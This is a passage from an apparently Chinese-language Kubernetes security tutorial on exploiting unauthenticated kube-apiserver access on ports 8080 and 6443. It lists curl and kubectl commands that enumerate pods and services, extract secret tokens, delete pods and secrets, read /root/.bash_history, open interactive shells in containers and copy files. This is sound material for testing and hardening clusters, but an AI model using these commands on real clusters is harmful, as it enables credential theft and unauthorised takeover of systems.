    <span class="token string">"/apis/storage.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/autoregister-completion"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/etcd"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/log"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/ping"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/apiservice-openapi-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/apiservice-registration-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/apiservice-status-available-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/bootstrap-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/ca-registration"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/generic-apiserver-start-informers"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/kube-apiserver-autoregistration"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/rbac/bootstrap-roles"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/scheduling/bootstrap-system-priority-classes"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/start-apiextensions-controllers"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/start-apiextensions-informers"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/start-kube-aggregator-informers"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/start-kube-apiserver-admission-initializer"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/start-kube-apiserver-informers"</span><span class="token punctuation">,</span>
    <span class="token string">"/logs"</span><span class="token punctuation">,</span>
    <span class="token string">"/metrics"</span><span class="token punctuation">,</span>
    <span class="token string">"/openapi/v2"</span><span class="token punctuation">,</span>
    <span class="token string">"/swagger-2.0.0.json"</span><span class="token punctuation">,</span>
    <span class="token string">"/swagger-2.0.0.pb-v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/swagger-2.0.0.pb-v1.gz"</span><span class="token punctuation">,</span>
    <span class="token string">"/swagger-ui/"</span><span class="token punctuation">,</span>
    <span class="token string">"/swagger.json"</span><span class="token punctuation">,</span>
    <span class="token string">"/swaggerapi"</span><span class="token punctuation">,</span>
    <span class="token string">"/version"</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get api</span>
curl http://ip:8080

<span class="token comment" spellcheck="true"># get pods</span>
curl http://ip:8080/api/v1/pods

<span class="token comment" spellcheck="true"># get services</span>
curl http://ip:8080/api/v1/services

<span class="token comment" spellcheck="true"># get namespaces:default serviceaccounts</span>
curl http://ip:8080/api/v1/serviceaccounts

<span class="token comment" spellcheck="true"># get namespaces</span>
curl http://ip:8080/api/v1/namespaces

<span class="token comment" spellcheck="true"># get namespaces:default pods</span>
curl http://ip:8080/api/v1/namespaces/default/pods

<span class="token comment" spellcheck="true"># get namespaces:default/pods:myapp</span>
curl http://ip:8080/api/v1/namespaces/default/pods/myapp

<span class="token comment" spellcheck="true"># get namespaces:default 守护进程</span>
curl http://ip:8080/api/v1/namespaces/default/daemonsets

<span class="token comment" spellcheck="true"># get namespaces:default services</span>
curl http://ip:8080/api/v1/namespaces/default/services

<span class="token comment" spellcheck="true"># get namespaces:default secrets</span>
curl http://ip:8080/api/v1/namespaces/default/secrets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="kubectl-1"><a href="#kubectl-1" class="headerlink" title="kubectl"></a>kubectl</h4><ul>
<li>Get node info</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get all nodes</span>
kubectl -s http://ip:8080 get no
kubectl -s http://ip:8080 get node
kubectl -s http://ip:8080 get nodes
<span class="token comment" spellcheck="true"># response</span>
NAME STATUS ROLES AGE VERSION

<span class="token comment" spellcheck="true"># get all nodes (more field information)</span>
kubectl -s http://ip:8080 get nodes -o wide
<span class="token comment" spellcheck="true"># response</span>
NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>Get namespace info</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get all namespaces</span>
kubectl -s http://ip:8080 get ns
kubectl -s http://ip:8080 get namespace
kubectl -s http://ip:8080 get namespaces
<span class="token comment" spellcheck="true"># response</span>
NAME STATUS AGE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>Get pod info</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get pods in a specific namespace</span>
kubectl -s http://ip:8080 get po -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s http://ip:8080 get pod -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s http://ip:8080 get pods -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
<span class="token comment" spellcheck="true"># response</span>
NAME READY STATUS RESTARTS AGE

<span class="token comment" spellcheck="true"># get pods in a specific namespace (more field information)</span>
kubectl -s http://ip:8080 get pods -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o wide
<span class="token comment" spellcheck="true"># response</span>
NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES

<span class="token comment" spellcheck="true"># get pods in the default namespace</span>
kubectl -s http://ip:8080 get pods
kubectl -s http://ip:8080 get pods -n default

<span class="token comment" spellcheck="true"># get pods in all namespace</span>
kubectl -s http://ip:8080 get pods -A
kubectl -s http://ip:8080 get pods --all-namespaces<span class="token operator">=</span>true
<span class="token comment" spellcheck="true"># response</span>
NAMESPACE NAME READY STATUS RESTARTS AGE

<span class="token comment" spellcheck="true"># get the describe information of pod in a specific namespace</span>
kubectl -s http://ip:8080 describe pod/<span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s http://ip:8080 describe pods/<span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>

<span class="token comment" spellcheck="true"># get detailed information(json) of pod in a specific namespace</span>
kubectl <span class="token function">command</span> <span class="token punctuation">(</span>TYPE NAME <span class="token operator">|</span> TYPE/NAME<span class="token punctuation">)</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span>
kubectl -s http://ip:8080 get pod/<span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o json
kubectl -s http://ip:8080 get pods/<span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o json
kubectl -s http://ip:8080 get pods <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o json
kubectl -s http://ip:8080 get pods <span class="token operator">&lt;</span>pod1<span class="token operator">></span> <span class="token operator">&lt;</span>pod2<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o json

<span class="token comment" spellcheck="true"># get detailed information(yaml) of pod in a specific namespace</span>
kubectl -s http://ip:8080 get pods <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o yaml

<span class="token comment" spellcheck="true"># get the log information of pod in a specific namespace</span>
kubectl -s http://ip:8080 logs -f --tail <span class="token operator">&lt;</span>count<span class="token operator">></span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span>

<span class="token comment" spellcheck="true"># delete pod in a specific namespace</span>
kubectl -s http://ip:8080 delete pods <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>Get serviceaccounts info</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get serviceaccounts in a specific namespace</span>
kubectl -s http://ip:8080 get sa -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s http://ip:8080 get serviceaccount -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s http://ip:8080 get serviceaccounts -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
<span class="token comment" spellcheck="true"># response</span>
NAME SECRETS AGE

<span class="token comment" spellcheck="true"># get serviceaccounts in the default namespace</span>
kubectl -s http://ip:8080 get sa
kubectl -s http://ip:8080 get sa -n default

<span class="token comment" spellcheck="true"># get serviceaccounts in all namespace</span>
kubectl -s http://ip:8080 get sa -A
kubectl -s http://ip:8080 get sa --all-namespaces<span class="token operator">=</span>true
<span class="token comment" spellcheck="true"># response</span>
NAMESPACE NAME SECRETS AGE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>Get secret info</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get secrets in a specific namespace</span>
kubectl -s http://ip:8080 get secret -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s http://ip:8080 get secrets -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
<span class="token comment" spellcheck="true"># response</span>
NAME TYPE DATA AGE

<span class="token comment" spellcheck="true"># get secrets in the default namespace</span>
kubectl -s http://ip:8080 get secrets
kubectl -s http://ip:8080 get secrets -n default

<span class="token comment" spellcheck="true"># get secrets in all namespace</span>
kubectl -s http://ip:8080 get secrets -A
kubectl -s http://ip:8080 get secrets --all-namespaces<span class="token operator">=</span>true
<span class="token comment" spellcheck="true"># response</span>
NAMESPACE NAME TYPE DATA AGE

<span class="token comment" spellcheck="true"># get the describe information of secret in a specific namespace</span>
kubectl -s http://ip:8080 describe secret/<span class="token operator">&lt;</span>secret<span class="token operator">></span>
kubectl -s http://ip:8080 describe secrets/<span class="token operator">&lt;</span>secret<span class="token operator">></span>

<span class="token comment" spellcheck="true"># get detailed information(json) of secret in a specific namespace</span>
kubectl -s http://ip:8080 get secrets <span class="token operator">&lt;</span>secret<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o json

<span class="token comment" spellcheck="true"># get detailed information(yaml) of secret in a specific namespace</span>
kubectl -s http://ip:8080 get secrets <span class="token operator">&lt;</span>secret<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o yaml

<span class="token comment" spellcheck="true"># get specific field information of secret in a specific namespace</span>
kubectl -s http://ip:8080 get secrets <span class="token operator">&lt;</span>secret<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o jsonpath<span class="token operator">=</span><span class="token string">'{}'</span>

<span class="token comment" spellcheck="true"># get specific field information of secret in a specific namespace</span>
kubectl -s http://ip:8080 get secrets <span class="token operator">&lt;</span>secret<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o jsonpath<span class="token operator">=</span><span class="token string">'{.data}'</span>

<span class="token comment" spellcheck="true"># get specific field information of secret in a specific namespace</span>
kubectl -s http://ip:8080 get secrets <span class="token operator">&lt;</span>secret<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o jsonpath<span class="token operator">=</span><span class="token string">'{.data.token}'</span>

<span class="token comment" spellcheck="true"># delete secret in a specific namespace</span>
kubectl -s http://ip:8080 delete secrets <span class="token operator">&lt;</span>secret<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>Get services info</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get services in a specific namespace</span>
kubectl -s http://ip:8080 get svc -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s http://ip:8080 get <span class="token function">service</span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s http://ip:8080 get services -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
<span class="token comment" spellcheck="true"># response</span>
NAME TYPE CLUSTER-IP EXTERNAL-IP PORT<span class="token punctuation">(</span>S<span class="token punctuation">)</span> AGE

<span class="token comment" spellcheck="true"># get services in a specific namespace (more field information)</span>
kubectl -s http://ip:8080 get services -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o wide
<span class="token comment" spellcheck="true"># response</span>
NAME TYPE CLUSTER-IP EXTERNAL-IP PORT<span class="token punctuation">(</span>S<span class="token punctuation">)</span> AGE SELECTOR

<span class="token comment" spellcheck="true"># get services in the default namespace</span>
kubectl -s http://ip:8080 get services
kubectl -s http://ip:8080 get services -n default

<span class="token comment" spellcheck="true"># get services in all namespace</span>
kubectl -s http://ip:8080 get services -A
kubectl -s http://ip:8080 get services --all-namespaces<span class="token operator">=</span>true
<span class="token comment" spellcheck="true"># response</span>
NAMESPACE NAME TYPE CLUSTER-IP EXTERNAL-IP PORT<span class="token punctuation">(</span>S<span class="token punctuation">)</span> AGE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>Exec command</li>
</ul>
<p>当仅只有一个container时，可不指定&lt;-c,container&gt;参数，工具会自动识别带上；如果存在多个container，则必须指定一个特定容器才能执行命令</p>
<pre class="line-numbers language-bash"><code class="language-bash">Usage:
  kubectl <span class="token function">exec</span> <span class="token punctuation">(</span>POD <span class="token operator">|</span> TYPE/NAME<span class="token punctuation">)</span> <span class="token punctuation">[</span>-n NAMESPACE<span class="token punctuation">]</span> <span class="token punctuation">[</span>-c CONTAINER<span class="token punctuation">]</span> <span class="token punctuation">[</span>flags<span class="token punctuation">]</span> -- COMMAND <span class="token punctuation">[</span>args<span class="token punctuation">..</span>.<span class="token punctuation">]</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># execute commands in the namespace.pod.container</span>
kubectl -s http://ip:8080 <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> -- <span class="token operator">&lt;</span>command<span class="token operator">></span> <span class="token punctuation">[</span>args<span class="token punctuation">..</span>.<span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># execute 'pwd' in the namespace.pod.container</span>
kubectl -s http://ip:8080 <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> <span class="token function">pwd</span>
kubectl -s http://ip:8080 <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> <span class="token function">pwd</span>

<span class="token comment" spellcheck="true"># exec namespace.pod.container ls</span>
kubectl -s http://ip:8080 <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> <span class="token function">ls</span>

<span class="token comment" spellcheck="true"># exec namespace.pod.container ls -al /root</span>
kubectl -s http://ip:8080 <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> -- <span class="token function">ls</span> -al /root

<span class="token comment" spellcheck="true"># exec namespace.pod.container cat /root/.bash_history</span>
kubectl -s http://ip:8080 <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> -- <span class="token function">cat</span> /root/.bash_history

<span class="token comment" spellcheck="true"># exec namespace.pod.container bash</span>
kubectl -s http://ip:8080 <span class="token function">exec</span> -it <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>File move</li>
</ul>
<p>如果pod存在多个container，则必须指定&lt;-c, container=&gt;参数</p>
<pre><code>Usage:
  kubectl cp &lt;file-spec-src&gt; &lt;file-spec-dest&gt; [options]

# download file
kubectl -s http://ip:8080 cp &lt;namespace&gt;/&lt;pod&gt;:/xxx/test.txt ./test.txt -c &lt;container&gt;

# upload file
kubectl -s http://ip:8080 cp ./test.txt &lt;namespace&gt;/&lt;pod&gt;:/xxx/test.txt -c &lt;container&gt;</code></pre><h3 id="Port-6443"><a href="#Port-6443" class="headerlink" title="Port 6443"></a>Port 6443</h3><p>正常情况下访问 <code>https://x.x.x.x:6443</code> 会提示无权限：<code>User &quot;system:anonymous&quot; cannot get at the cluster scope.</code>。但是，如果 <code>kube-apiserver</code> <code>6443</code> 开启了匿名访问，则可未授权访问控制 <code>Kubernetes</code> 集群，如下图所示</p>
<p><img src="/2021/08/15/Kubernetes-Security/image-20210912015652506-164735412549210.png" alt="image-20210912015652506"></p>
<pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"paths"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">"/api"</span><span class="token punctuation">,</span>
    <span class="token string">"/api/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/admissionregistration.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/admissionregistration.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/admissionregistration.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apiextensions.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apiextensions.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apiextensions.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apiregistration.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apiregistration.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apiregistration.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apps"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/apps/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/authentication.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/authentication.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/authentication.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/authorization.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/authorization.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/authorization.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/autoscaling"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/autoscaling/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/autoscaling/v2beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/autoscaling/v2beta2"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/batch"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/batch/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/batch/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/certificates.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/certificates.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/certificates.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/coordination.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/coordination.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/coordination.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/crd.projectcalico.org"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/crd.projectcalico.org/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/discovery.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/discovery.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/events.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/events.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/events.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/extensions"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/extensions/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/networking.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/networking.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/networking.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/node.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/node.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/policy"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/policy/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/rbac.authorization.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/rbac.authorization.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/rbac.authorization.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/scheduling.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/scheduling.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/scheduling.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/storage.k8s.io"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/storage.k8s.io/v1"</span><span class="token punctuation">,</span>
    <span class="token string">"/apis/storage.k8s.io/v1beta1"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/autoregister-completion"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/etcd"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/log"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/ping"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/aggregator-reload-proxy-client-cert"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/apiservice-openapi-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/apiservice-registration-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/apiservice-status-available-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/bootstrap-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/crd-informer-synced"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/generic-apiserver-start-informers"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/kube-apiserver-autoregistration"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/max-in-flight-filter"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/rbac/bootstrap-roles"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/scheduling/bootstrap-system-priority-classes"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/start-apiextensions-controllers"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/start-apiextensions-informers"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/start-cluster-authentication-info-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/start-kube-aggregator-informers"</span><span class="token punctuation">,</span>
    <span class="token string">"/healthz/poststarthook/start-kube-apiserver-admission-initializer"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/autoregister-completion"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/etcd"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/log"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/ping"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/aggregator-reload-proxy-client-cert"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/apiservice-openapi-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/apiservice-registration-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/apiservice-status-available-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/bootstrap-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/crd-informer-synced"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/generic-apiserver-start-informers"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/kube-apiserver-autoregistration"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/max-in-flight-filter"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/rbac/bootstrap-roles"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/scheduling/bootstrap-system-priority-classes"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/start-apiextensions-controllers"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/start-apiextensions-informers"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/start-cluster-authentication-info-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/start-kube-aggregator-informers"</span><span class="token punctuation">,</span>
    <span class="token string">"/livez/poststarthook/start-kube-apiserver-admission-initializer"</span><span class="token punctuation">,</span>
    <span class="token string">"/logs"</span><span class="token punctuation">,</span>
    <span class="token string">"/metrics"</span><span class="token punctuation">,</span>
    <span class="token string">"/openapi/v2"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/autoregister-completion"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/etcd"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/informer-sync"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/log"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/ping"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/aggregator-reload-proxy-client-cert"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/apiservice-openapi-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/apiservice-registration-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/apiservice-status-available-controller"</span><span class="token punctuation">,</span>
